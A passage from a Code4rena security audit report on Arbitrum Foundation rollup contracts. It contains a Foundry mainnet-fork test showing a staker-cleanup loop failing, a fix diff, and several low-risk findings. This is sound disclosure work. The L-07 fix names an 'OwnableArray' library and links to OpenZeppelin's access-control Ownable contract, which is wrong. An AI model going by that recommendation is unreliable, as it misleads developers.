    function getStaker(address staker) external view returns (OldStaker memory);
}

contract C4 is Test {
    IOldRollup oldRollup;
    address admin;
    function setUp() public {
        uint256 forkId = vm.createFork("https://rpc.ankr.com/eth");
        vm.selectFork(forkId);
        oldRollup = IOldRollup(0x5eF0D09d1E6204141B4d37530808eD19f60FBa35);
        admin = 0x3ffFbAdAF827559da092217e474760E2b2c3CeDd;
    }

    function test_Cleanup() public {
        vm.startPrank(admin);
        oldRollup.pause();
        uint64 stakerCount = oldRollup.stakerCount();
        // since we for-loop these stakers we set an arbitrary limit - we dont
        // expect any instances to have close to this number of stakers
        if (stakerCount > 50) {
            stakerCount = 50;
        }
        for (uint64 i = 0; i < stakerCount; i++) {
            // FAILS with panic: array out-of-bounds access 
            address stakerAddr = oldRollup.getStakerAddress(i);
            OldStaker memory staker = oldRollup.getStaker(stakerAddr);
            if (staker.isStaked && staker.currentChallenge == 0) {
                address[] memory stakersToRefund = new address[](1);
                stakersToRefund[0] = stakerAddr;
                oldRollup.forceRefundStaker(stakersToRefund);
            }
        }
    }
}
```

### Tools Used

Foundry

### Recommended Mitigation Steps

```diff
    function cleanupOldRollup() private {
        IOldRollupAdmin(address(OLD_ROLLUP)).pause();

        uint64 stakerCount = ROLLUP_READER.stakerCount();
        // since we for-loop these stakers we set an arbitrary limit - we dont
        // expect any instances to have close to this number of stakers
        if (stakerCount > 50) {
            stakerCount = 50;
        }
+       for (uint64 i = 0; i < stakerCount;) {
            address stakerAddr = ROLLUP_READER.getStakerAddress(i);
            OldStaker memory staker = ROLLUP_READER.getStaker(stakerAddr);
            if (staker.isStaked && staker.currentChallenge == 0) {
                address[] memory stakersToRefund = new address[](1);
                stakersToRefund[0] = stakerAddr;

                IOldRollupAdmin(address(OLD_ROLLUP)).forceRefundStaker(stakersToRefund);
+               stakerCount -= 1;
+           } else {
+               i++;
+           }
        }

```

**[godzillaba (Arbitrum) confirmed](https://github.com/code-423n4/2024-05-arbitrum-foundation-findings/issues/5#issuecomment-2142836203)**

**[gzeoneth (Arbitrum) commented](https://github.com/code-423n4/2024-05-arbitrum-foundation-findings/issues/5#issuecomment-2145631283):**
 > Fixed with https://github.com/OffchainLabs/bold/pull/654/.

**[Picodes (judge) commented](https://github.com/code-423n4/2024-05-arbitrum-foundation-findings/issues/5#issuecomment-2148504960):**
 > Keeping this report as best as the mitigation takes into account the `if` condition.



***

# Low Risk and Non-Critical Issues

For this audit, 23 reports were submitted by wardens detailing low risk and non-critical issues. The [report highlighted below](https://github.com/code-423n4/2024-05-arbitrum-foundation-findings/issues/66) by **Sathish9098** received the top score from the judge.

*The following wardens also submitted reports: [ladboy233](https://github.com/code-423n4/2024-05-arbitrum-foundation-findings/issues/65), [Rhaydden](https://github.com/code-423n4/2024-05-arbitrum-foundation-findings/issues/63), [dontonka](https://github.com/code-423n4/2024-05-arbitrum-foundation-findings/issues/72), [K42](https://github.com/code-423n4/2024-05-arbitrum-foundation-findings/issues/68), [slvDev](https://github.com/code-423n4/2024-05-arbitrum-foundation-findings/issues/64), [Dup1337](https://github.com/code-423n4/2024-05-arbitrum-foundation-findings/issues/59), [xuwinnie](https://github.com/code-423n4/2024-05-arbitrum-foundation-findings/issues/7), [SpicyMeatball](https://github.com/code-423n4/2024-05-arbitrum-foundation-findings/issues/4), [bronze\_pickaxe](https://github.com/code-423n4/2024-05-arbitrum-foundation-findings/issues/73), [fyamf](https://github.com/code-423n4/2024-05-arbitrum-foundation-findings/issues/67), [hihen](https://github.com/code-423n4/2024-05-arbitrum-foundation-findings/issues/62), [ZanyBonzy](https://github.com/code-423n4/2024-05-arbitrum-foundation-findings/issues/61), [forgebyola](https://github.com/code-423n4/2024-05-arbitrum-foundation-findings/issues/60), [Takarez](https://github.com/code-423n4/2024-05-arbitrum-foundation-findings/issues/42), [twcctop](https://github.com/code-423n4/2024-05-arbitrum-foundation-findings/issues/41), [Audinarey](https://github.com/code-423n4/2024-05-arbitrum-foundation-findings/issues/36), [josephdara](https://github.com/code-423n4/2024-05-arbitrum-foundation-findings/issues/35), [guhu95](https://github.com/code-423n4/2024-05-arbitrum-foundation-findings/issues/26), [zanderbyte](https://github.com/code-423n4/2024-05-arbitrum-foundation-findings/issues/24), [carlitox477](https://github.com/code-423n4/2024-05-arbitrum-foundation-findings/issues/18), [LessDupes](https://github.com/code-423n4/2024-05-arbitrum-foundation-findings/issues/14), and [KupiaSec](https://github.com/code-423n4/2024-05-arbitrum-foundation-findings/issues/11).*

## [L-01] Risk of Confirming Assertion Prematurely if `totalTimeUnrivaled` Equals `confirmationThresholdBlock`

The current check if (totalTimeUnrivaled < confirmationThresholdBlock) only reverts when totalTimeUnrivaled is strictly less than confirmationThresholdBlock. This means that if totalTimeUnrivaled is exactly equal to confirmationThresholdBlock, the condition is not met, and the code proceeds without reverting.

However, in the context of confirming assertions, this can be problematic. If the totalTimeUnrivaled is exactly equal to confirmationThresholdBlock, it implies that the confirmationThresholdBlock has not been fully passed yet. To ensure that the assertion is confirmed only after the required confirmation blocks have fully passed, the check should also include the case where totalTimeUnrivaled is equal to confirmationThresholdBlock.

```solidity
FILE:2024-05-arbitrum-foundation/src/challengeV2/libraries/EdgeChallengeManagerLib.sol

if (totalTimeUnrivaled < confirmationThresholdBlock) {
            revert InsufficientConfirmationBlocks(totalTimeUnrivaled, confirmationThresholdBlock);
        }

```
https://github.com/code-423n4/2024-05-arbitrum-foundation/blob/6f861c85b281a29f04daacfe17a2099d7dad5f8f/src/challengeV2/libraries/EdgeChallengeManagerLib.sol#L741-L743

### Recommended Mitigation

```diff
- if (totalTimeUnrivaled < confirmationThresholdBlock) {
+ if (totalTimeUnrivaled <= confirmationThresholdBlock) {
            revert InsufficientConfirmationBlocks(totalTimeUnrivaled, confirmationThresholdBlock);
        }
```
## [L-02] `mandatoryBisectionHeight()` not return expected results

### Expected Result
The documentation states: `Returns the highest power of 2 in the differing lower bits of start and end.` This means the function should identify the highest power of 2 in the bits where start and end differ.

### Actual Result
The function does not return the highest power of 2 in the differing lower bits; rather, it uses the most significant differing bit to create a mask and apply it to (end - 1). 

```solidity
FILE: 2024-05-arbitrum-foundation/src/challengeV2/libraries
/EdgeChallengeManagerLib.sol 

 function mandatoryBisectionHeight(uint256 start, uint256 end) internal pure returns (uint256) {
        if (end - start < 2) {
            revert HeightDiffLtTwo(start, end);
        }
        if (end - start == 2) {
            return start + 1;
        }

        uint256 diff = (end - 1) ^ start;
        uint256 mostSignificantSharedBit = UintUtilsLib.mostSignificantBit(diff);
        uint256 mask = type(uint256).max << mostSignificantSharedBit;
        return ((end - 1) & mask);
    }

```
https://github.com/code-423n4/2024-05-arbitrum-foundation/blob/6f861c85b281a29f04daacfe17a2099d7dad5f8f/src/challengeV2/libraries/EdgeChallengeManagerLib.sol#L574-L588

## [L-03] Misleading comment in `setOutbox()` function

The current comment indicates that the function is adding a contract authorized to put messages into the rollup's inbox, but the function itself is setting an outbox contract and registering it with the bridge, rather than directly dealing with the inbox.

```solidity
FILE: 2024-05-arbitrum-foundation/src/rollup/RollupAdminLogic.sol

/**
     * @notice Add a contract authorized to put messages into this rollup's inbox
     * @param _outbox Outbox contract to add
     */
    function setOutbox(IOutbox _outbox) external override {
        outbox = _outbox;
        bridge.setOutbox(address(_outbox), true);
        emit OwnerFunctionCalled(0);
    }

```
https://github.com/code-423n4/2024-05-arbitrum-foundation/blob/6f861c85b281a29f04daacfe17a2099d7dad5f8f/src/rollup/RollupAdminLogic.sol#L113-L121

### Recommended Mitigation
Here's a revised version of the comment to more accurately reflect the function's purpose.

```solidity
/**
 * @notice Set the outbox contract for the rollup and authorize it on the bridge
 * @param _outbox The outbox contract to be set and authorized
 */
function setOutbox(IOutbox _outbox) external override {
    outbox = _outbox;
    bridge.setOutbox(address(_outbox), true);
    emit OwnerFunctionCalled(0);
}

```

## [L-04] `if (ard.assertionHash != args.claimId) {` Potentially Redundant Check Between assertionHash and claimId in `layerZeroTypeSpecificChecks()` function

There is no possibility that values are different. ``args.claimId`` value only assigned to ``ard.assertionHash`` when creating ``ard`` variable .

```solidity
FILE: Breadcrumbs2024-05-arbitrum-foundation/src/challengeV2
/EdgeChallengeManager.sol

 ard = AssertionReferenceData(
                args.claimId,
                claimStateData.prevAssertionHash,
                assertionChain.isPending(args.claimId),
                assertionChain.getSecondChildCreationBlock(claimStateData.prevAssertionHash) > 0,
                predecessorStateData.assertionState,
                claimStateData.assertionState
            );

```
https://github.com/code-423n4/2024-05-arbitrum-foundation/blob/6f861c85b281a29f04daacfe17a2099d7dad5f8f/src/challengeV2/EdgeChallengeManager.sol#L409

```solidity
FILE: 2024-05-arbitrum-foundation/src/challengeV2/libraries
/EdgeChallengeManagerLib.sol

if (ard.assertionHash != args.claimId) {
                revert AssertionHashMismatch(ard.assertionHash, args.claimId);
            }

```
https://github.com/code-423n4/2024-05-arbitrum-foundation/blob/6f861c85b281a29f04daacfe17a2099d7dad5f8f/src/challengeV2/libraries/EdgeChallengeManagerLib.sol#L232-L234

## [L-05] Incorrect Comment Describing Execution State Check in `layerZeroTypeSpecificChecks()` Function

```solidity
FILE:2024-05-arbitrum-foundation/src/challengeV2/libraries
/EdgeChallengeManagerLib.sol

// check the start and end execution states exist, the block hash entry should be non zero
            if (ard.startState.machineStatus == MachineStatus.RUNNING) {
                revert EmptyStartMachineStatus();
            }
            if (ard.endState.machineStatus == MachineStatus.RUNNING) {
                revert EmptyEndMachineStatus();
            }

```

This comment suggests that the check is verifying the existence of the start and end execution states and implies something about block hash entries, which is not what the code does.

### Recommended Mitigation

Add appropriate comments.

```solidity
// Check that the start and end execution states are not running
// The machine status should not be 'RUNNING' for either the start or end state
            if (ard.startState.machineStatus == MachineStatus.RUNNING) {
                revert EmptyStartMachineStatus();
            }
            if (ard.endState.machineStatus == MachineStatus.RUNNING) {
                revert EmptyEndMachineStatus();
            }


```

## [L-06] Consequences of Missing Validation in critical `setMinimumAssertionPeriod` and `setBaseStake` Functions

The function setMinimumAssertionPeriod sets the minimumAssertionPeriod state variable to newPeriod without performing any validation checks. This lack of validation can lead to the assignment of invalid or unreasonable values, which can adversely affect the contract's behavior and security. Same to `setBaseStake()` function.

```solidity
FILE: 2024-05-arbitrum-foundation/src/rollup
/RollupAdminLogic.sol

function setMinimumAssertionPeriod(uint256 newPeriod) external override {
        minimumAssertionPeriod = newPeriod;
        emit OwnerFunctionCalled(8);
    }

function setBaseStake(uint256 newBaseStake) external override {
        baseStake = newBaseStake;
        emit OwnerFunctionCalled(12);
    }

``` 
https://github.com/code-423n4/2024-05-arbitrum-foundation/blob/6f861c85b281a29f04daacfe17a2099d7dad5f8f/src/rollup/RollupAdminLogic.sol#L204-L207

## [L-07] Inefficient Array Resizing in `append()` Function

The gas cost of the append function might exceed the gas limit set for a transaction. This gas limit specifies the maximum amount of gas a user is willing to spend on a transaction. This can be problematic, especially in situations where the exact size of the appended data might not be known beforehand.

```solidity
FILE: 2024-05-arbitrum-foundation/src/challengeV2/libraries
/ArrayUtilsLib.sol

function append(bytes32[] memory arr, bytes32 newItem) internal pure returns (bytes32[] memory) {
        bytes32[] memory clone = new bytes32[](arr.length + 1);
        for (uint256 i = 0; i < arr.length; i++) {
            clone[i] = arr[i];
        }
        clone[clone.length - 1] = newItem;
        return clone;
    }

```
https://github.com/code-423n4/2024-05-arbitrum-foundation/blob/6f861c85b281a29f04daacfe17a2099d7dad5f8f/src/challengeV2/libraries/ArrayUtilsLib.sol#L16

### Recommended Mitigation
Use a resizable array library like OwnableArray from the OpenZeppelin Contracts library (https://github.com/OpenZeppelin/openzeppelin-contracts/blob/master/contracts/access/Ownable.sol). These libraries offer functions to append elements dynamically without the need to manually allocate and copy the entire array.

## [L-08] `block.number >= assertion.createdAtBlock + prevConfig.confirmPeriodBlocks` not implemented as per docs

Comment: "Check that deadline has passed"

This implies the deadline should be strictly in the past, meaning the current block number must be greater than the deadline block number.

```solidity
FILE: 2024-05-arbitrum-foundation/src/rollup
/RollupUserLogic.sol

// Check that deadline has passed
        require(block.number >= assertion.createdAtBlock + prevConfig.confirmPeriodBlocks, "BEFORE_DEADLINE");

```

### Recommended Mitgation
1) Change comment as per implementation.

```solidity

// Check that deadline has passed or equal
        require(block.number >= assertion.createdAtBlock + prevConfig.confirmPeriodBlocks, "BEFORE_DEADLINE");

```

2. Change code as per docs.

```solidity

// Check that deadline has passed
        require(block.number > assertion.createdAtBlock + prevConfig.confirmPeriodBlocks, "BEFORE_DEADLINE");

```

## [L-09] `reduceStakeTo` Function Allows Call Even with Zero Staked Amount

The reduceStakeTo function does not have any check to prevent it from being called when staker.amountStaked is zero. This means if a staker's amountStaked is zero, the function can still be called, and it would set the amountStaked to the target value, which could result in unintended behavior.

```solidity
FILE: 2024-05-arbitrum-foundation/src/rollup
/RollupCore.sol

 function reduceStakeTo(address stakerAddress, uint256 target) internal returns (uint256) {
        Staker storage staker = _stakerMap[stakerAddress];
        address withdrawalAddress = staker.withdrawalAddress;
        uint256 current = staker.amountStaked;
        require(target <= current, "TOO_LITTLE_STAKE");
        uint256 amountWithdrawn = current - target;
        staker.amountStaked = target;
        increaseWithdrawableFunds(withdrawalAddress, amountWithdrawn);
        emit UserStakeUpdated(stakerAddress, withdrawalAddress, current, target);
        return amountWithdrawn;
    }

```
https://github.com/code-423n4/2024-05-arbitrum-foundation/blob/6f861c85b281a29f04daacfe17a2099d7dad5f8f/src/rollup/RollupCore.sol#L300-L310

### Recommended Mitigation

`staker.amountStaked` is 0 then the call should be reverted.

`require(current > 0,"zero amount staked");`

## [N-01] `newStakeOnNewAssertion` function reverts all calls when contract paused

There is a potential flaw related to the function stakeOnNewAssertion being called within newStakeOnNewAssertion. The stakeOnNewAssertion function has the whenNotPaused modifiers, meaning it should only be executed only when the contract is not paused. However, these conditions are not enforced within the newStakeOnNewAssertion function, leading to potential inconsistencies.

```solidity
FILE: 2024-05-arbitrum-foundation/src/rollup
/RollupUserLogic.sol

function newStakeOnNewAssertion(
        uint256 tokenAmount,
        AssertionInputs calldata assertion,
        bytes32 expectedAssertionHash,
        address withdrawalAddress
    ) public {
        require(withdrawalAddress != address(0), "EMPTY_WITHDRAWAL_ADDRESS");
        _newStake(tokenAmount, withdrawalAddress);
        stakeOnNewAssertion(assertion, expectedAssertionHash);
        /// @dev This is an external call, safe because it's at the end of the function
        receiveTokens(tokenAmount);
    }

function stakeOnNewAssertion(AssertionInputs calldata assertion, bytes32 expectedAssertionHash)
        public
        onlyValidator
        whenNotPaused
    {

```
https://github.com/code-423n4/2024-05-arbitrum-foundation/blob/6f861c85b281a29f04daacfe17a2099d7dad5f8f/src/rollup/RollupUserLogic.sol#L163-L167

### Recommended Mitigation

```diff
FILE: 2024-05-arbitrum-foundation/src/rollup
/RollupUserLogic.sol

function newStakeOnNewAssertion(
        uint256 tokenAmount,
        AssertionInputs calldata assertion,
        bytes32 expectedAssertionHash,
        address withdrawalAddress
-    ) public {
+    ) public whenNotPaused {
        require(withdrawalAddress != address(0), "EMPTY_WITHDRAWAL_ADDRESS");
        _newStake(tokenAmount, withdrawalAddress);
        stakeOnNewAssertion(assertion, expectedAssertionHash);
        /// @dev This is an external call, safe because it's at the end of the function
        receiveTokens(tokenAmount);
    }

```



***

# Disclosures

C4 is an open organization governed by participants in the community.

C4 audits incentivize the discovery of exploits, vulnerabilities, and bugs in smart contracts. Security researchers are rewarded at an increasing rate for finding higher-risk issues. Audit submissions are judged by a knowledgeable security researcher and solidity developer and disclosed to sponsoring developers. C4 does not conduct formal verification regarding the provided code but instead provides final verification.

C4 does not provide any guarantee or warranty regarding the security of this project. All smart contract software should be used at the sole risk and responsibility of users.
